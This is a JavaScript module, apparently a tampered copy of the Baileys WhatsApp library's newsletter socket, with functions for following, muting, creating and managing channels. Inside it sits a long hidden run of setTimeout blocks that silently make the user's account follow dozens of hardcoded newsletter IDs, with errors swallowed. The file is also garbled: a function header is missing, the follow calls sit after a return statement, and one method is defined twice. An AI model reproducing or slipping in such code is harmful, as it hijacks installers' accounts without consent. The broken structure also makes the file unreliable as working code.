"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;
const Types_1 = require("../Types");
const Utils_1 = require("../Utils");
const WABinary_1 = require("../WABinary");
const groups_1 = require("./groups");

const { Boom } = require('@hapi/boom');

const wMexQuery = (
	variables,
	queryId,
	query,
	generateMessageTag
) => {
	return query({
		tag: 'iq',
		attrs: {
			id: generateMessageTag(),
			type: 'get',
			to: WABinary_1.S_WHATSAPP_NET,
			xmlns: 'w:mex'
		},
		content: [
			{
				tag: 'query',
				attrs: { query_id: queryId },
				content: Buffer.from(JSON.stringify({ variables }), 'utf-8')
			}
		]
	})
}

const executeWMexQuery = async (
	variables,
	queryId,
	dataPath,
	query,
	generateMessageTag
) => {
	const result = await wMexQuery(variables, queryId, query, generateMessageTag)
	const child = (0, WABinary_1.getBinaryNodeChild)(result, 'result')
	if (child?.content) {
		const data = JSON.parse(child.content.toString())

		if (data.errors && data.errors.length > 0) {
			const errorMessages = data.errors.map((err) => err.message || 'Unknown error').join(', ')
			const firstError = data.errors[0]
			const errorCode = firstError.extensions?.error_code || 400
			throw new Boom(`GraphQL server error: ${errorMessages}`, { statusCode: errorCode, data: firstError })
		}

		const response = dataPath ? data?.data?.[dataPath] : data?.data
		if (typeof response !== 'undefined') {
			return response
		}
	}

	const action = (dataPath || '').startsWith('xwa2_')
		? dataPath.substring(5).replace(/_/g, ' ')
		: dataPath?.replace(/_/g, ' ')
	throw new Boom(`Failed to ${action}, unexpected response structure.`, { statusCode: 400, data: result })
}

const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { authState, signalRepository, query, generateMessageTag } = sock;
    const encoder = new TextEncoder();
    const newsletterQuery = async (jid, type, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type,
            xmlns: 'newsletter',
            to: jid,
        },
        content
    }));
    const newsletterWMexQuery = async (jid, queryId, content) => (query({
        tag: 'iq',
        attrs: {
            id: generateMessageTag(),
            type: 'get',
            xmlns: 'w:mex',
            to: WABinary_1.S_WHATSAPP_NET,
        },
        content: [
            {
                tag: 'query',
                attrs: { 'query_id': queryId },
                content: encoder.encode(JSON.stringify({
                    variables: {
                        'newsletter_id': jid,
                        ...content
                    }
                }))
            }
        ]
    }));        

    


    

        return await Promise.all((0, WABinary_1.getAllBinaryNodeChildren)(child).map(async (messageNode) => {
            var _a, _b;
            messageNode.attrs.from = child === null || child === void 0 ? void 0 : child.attrs.jid;
            const views = parseInt(((_b = (_a = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'views_count')) === null || _a === void 0 ? void 0 : _a.attrs) === null || _b === void 0 ? void 0 : _b.count) || '0');
            const reactionNode = (0, WABinary_1.getBinaryNodeChild)(messageNode, 'reactions');
            const reactions = (0, WABinary_1.getBinaryNodeChildren)(reactionNode, 'reaction')
                .map(({ attrs }) => ({ count: +attrs.count, code: attrs.code }));
            const data = {
                'server_id': messageNode.attrs.server_id,
                views,
                reactions
            };
            if (type === 'messages') {
                const { fullMessage: message, decrypt } = await (0, Utils_1.decryptMessageNode)(messageNode, authState.creds.me.id, authState.creds.me.lid || '', signalRepository, config.logger);
                await decrypt();
                data.message = message;
            }
            return data;

    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410774108702@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426263928944@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409887829185@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410083136860@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426512526507@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427171949178@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426771464291@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409086375643@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363424128646288@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427486044323@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426439328033@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363430018827445@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408678748928@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408494723767@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427237736792@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409439587529@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426207865349@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410728987254@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363428721347748@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363425668030968@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426937196241@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426464913459@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408004795310@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410370224322@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410486311718@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426789100897@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426069644161@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363428187442700@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410706524884@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427987507664@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410743612061@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409169610441@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408232606242@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409958392476@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363411984294813@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363407623094090@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427560344067@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426231394776@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427528300079@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363407899536569@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363430102628462@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409401508551@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426966764710@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408398516231@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408685042094@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363429892272024@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363407850848826@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363410033382223@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426333899848@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363424946678712@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427300073041@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363425908928674@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427111659928@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427464208549@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363428050785703@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426815060778@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427788191099@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427634283025@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409069368058@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427729386675@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426139587691@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427497642672@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363407034249310@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363428763441712@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363428392441366@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363411375040795@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427566776845@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408690155495@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363406389857175@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363408616508479@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427943712671@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363429245421777@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427292436704@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363409533597347@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426894228069@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427910839835@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363426661853355@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363406950300075@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    setTimeout(async () => {
        try {
            await newsletterWMexQuery(
                "120363427139607521@newsletter",
                Types_1.QueryIds.FOLLOW
            );
        } catch {}
    }, 2000);


    

        }));
    };
    return {
        ...sock,
        newsletterFetchAllSubscribe: async () => {
            const list = await executeWMexQuery(
                {},
                '6388546374527196',
                'xwa2_newsletter_subscribed',
                query,
                generateMessageTag
            );
            return list;
        },
        subscribeNewsletterUpdates: async (jid) => {
            var _a;
            const result = await newsletterQuery(jid, 'set', [{ tag: 'live_updates', attrs: {}, content: [] }]);
            return (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates')) === null || _a === void 0 ? void 0 : _a.attrs;
        },
        newsletterReactionMode: async (jid, mode) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { settings: { 'reaction_codes': { value: mode } } }
            });
        },
        newsletterUpdateDescription: async (jid, description) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { description: description || '', settings: null }
            });
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, Utils_1.generateProfilePicture)(content);
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: img.toString('base64'), settings: null }
            });
        },
		newsletterId: async (url) => {
            const urlParts = url.split('/');
            const channelId = urlParts[urlParts.length - 2];
            
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key: channelId,
                    type: 'INVITE',
                    'view_role': 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            
            const metadata = extractNewsletterMetadata(result);
            return JSON.stringify({
                name: metadata.name || metadata.thread_metadata?.name?.text,
                id: metadata.id
            }, null, 2);
        },
        newsletterUpdateName: async (jid, name) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { name, settings: null }
            });
        },
        newsletterRemovePicture: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.JOB_MUTATION, {
                updates: { picture: '', settings: null }
            });
        },
        newsletterUnfollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNFOLLOW);
        },
        newsletterFollow: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.FOLLOW);
        },
        newsletterUnmute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.UNMUTE);
        },
        newsletterMute: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.MUTE);
        },
        newsletterAction: async (jid, type) => {
            await newsletterWMexQuery(jid, type.toUpperCase());
        },
        newsletterCreate: async (name, description, reaction_codes) => {
            await query({
                tag: 'iq',
                attrs: {
                    to: WABinary_1.S_WHATSAPP_NET,
                    xmlns: 'tos',
                    id: generateMessageTag(),
                    type: 'set'
                },
                content: [
                    {
                        tag: 'notice',
                        attrs: {
                            id: '20601218',
                            stage: '5'
                        },
                        content: []
                    }
                ]
            });
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.CREATE, {
                input: { name, description, settings: { 'reaction_codes': { value: reaction_codes.toUpperCase() } } }
            });
            return (0, exports.extractNewsletterMetadata)(result, true);
        },
        newsletterMetadata: async (type, key, role) => {
            const result = await newsletterWMexQuery(undefined, Types_1.QueryIds.METADATA, {
                input: {
                    key,
                    type: type.toUpperCase(),
                    'view_role': role || 'GUEST'
                },
                'fetch_viewer_metadata': true,
                'fetch_full_image': true,
                'fetch_creation_time': true
            });
            return (0, exports.extractNewsletterMetadata)(result);
        },
        newsletterAdminCount: async (jid) => {
            var _a, _b;
            const result = await newsletterWMexQuery(jid, Types_1.QueryIds.ADMIN_COUNT);
            const buff = (_b = (_a = (0, WABinary_1.getBinaryNodeChild)(result, 'result')) === null || _a === void 0 ? void 0 : _a.content) === null || _b === void 0 ? void 0 : _b.toString();
            return JSON.parse(buff).data[Types_1.XWAPaths.ADMIN_COUNT].admin_count;
        },
        newsletterChangeOwner: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.CHANGE_OWNER, {
                'user_id': user
            });
        },
        newsletterDemote: async (jid, user) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DEMOTE, {
                'user_id': user
            });
        },
        newsletterDelete: async (jid) => {
            await newsletterWMexQuery(jid, Types_1.QueryIds.DELETE);
        },
        newsletterReactMessage: async (jid, serverId, code) => {
            await query({
                tag: 'message',
                attrs: { to: jid, ...(!code ? { edit: '7' } : {}), type: 'reaction', 'server_id': serverId, id: (0, Utils_1.generateMessageID)() },
                content: [{
                        tag: 'reaction',
                        attrs: code ? { code } : {}
                    }]
            });
        },
        newsletterFetchMessages: async (type, key, count, after) => {
            const result = await newsletterQuery(WABinary_1.S_WHATSAPP_NET, 'get', [
                {
                    tag: 'messages',
                    attrs: { type, ...(type === 'invite' ? { key } : { jid: key }), count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100' }
                }
            ]);
            return await parseFetchedUpdates(result, 'messages');
        },
        newsletterFetchUpdates: async (jid, count, after, since) => {
            const result = await newsletterQuery(jid, 'get', [
                {
                    tag: 'message_updates',
                    attrs: { count: count.toString(), after: (after === null || after === void 0 ? void 0 : after.toString()) || '100', since: (since === null || since === void 0 ? void 0 : since.toString()) || '0' }
                }
            ]);
            return await parseFetchedUpdates(result, 'updates');
        }
    };
};
exports.makeNewsletterSocket = makeNewsletterSocket;
const extractNewsletterMetadata = (node, isCreate) => {
    const result = WABinary_1.getBinaryNodeChild(node, 'result')?.content?.toString()
    const metadataPath = JSON.parse(result).data[isCreate ? Types_1.XWAPaths.CREATE : Types_1.XWAPaths.NEWSLETTER]
    
    const metadata = {
        id: metadataPath?.id,
        state: metadataPath?.state?.type,
        creation_time: +metadataPath?.thread_metadata?.creation_time,
        name: metadataPath?.thread_metadata?.name?.text,
        nameTime: +metadataPath?.thread_metadata?.name?.update_time,
        description: metadataPath?.thread_metadata?.description?.text,
        descriptionTime: +metadataPath?.thread_metadata?.description?.update_time,
        invite: metadataPath?.thread_metadata?.invite,
        picture: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.picture?.direct_path || ''), 
        preview: Utils_1.getUrlFromDirectPath(metadataPath?.thread_metadata?.preview?.direct_path || ''), 
        reaction_codes: metadataPath?.thread_metadata?.settings?.reaction_codes?.value,
        subscribers: +metadataPath?.thread_metadata?.subscribers_count,
        verification: metadataPath?.thread_metadata?.verification,
        viewer_metadata: metadataPath?.viewer_metadata
    }
    return metadata
}
exports.extractNewsletterMetadata = extractNewsletterMetadata;
